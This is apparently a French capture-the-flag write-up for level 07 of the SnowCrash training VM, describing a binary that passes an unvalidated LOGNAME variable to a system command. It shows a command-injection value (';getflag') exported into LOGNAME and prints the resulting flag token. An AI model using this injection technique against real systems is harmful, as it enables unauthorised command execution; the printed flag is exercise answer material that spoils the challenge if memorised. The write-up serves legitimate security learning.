# Level 07 - Solution

## Étape 1 : Découverte et analyse du binaire

On trouve un binaire `level07` à la racine du répertoire home.

### Décompilation du binaire

Utiliser [Dogbolt](https://dogbolt.org) ou un autre décompilateur pour analyser le binaire.


## Étape 2 : Analyse de la vulnérabilité

### 🔍 Comportement du binaire

Le binaire :
1. Récupère la variable d'environnement `LOGNAME` via `getenv("LOGNAME")`
2. Utilise cette variable dans une commande système
3. **N'effectue aucune validation** sur le contenu de `LOGNAME`

## Étape 3 : Exploitation - Environment Variable Injection

### Modifier la variable LOGNAME

Remplacer `LOGNAME` par une payload qui injecte `getflag` :

```bash
level07@SnowCrash:~$ export LOGNAME=";getflag"
```


### Exécuter le binaire

```bash
level07@SnowCrash:~$ ./level07
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```

## Résultat

**Flag** : `fiumuikeil55xe9cu4dood66h`
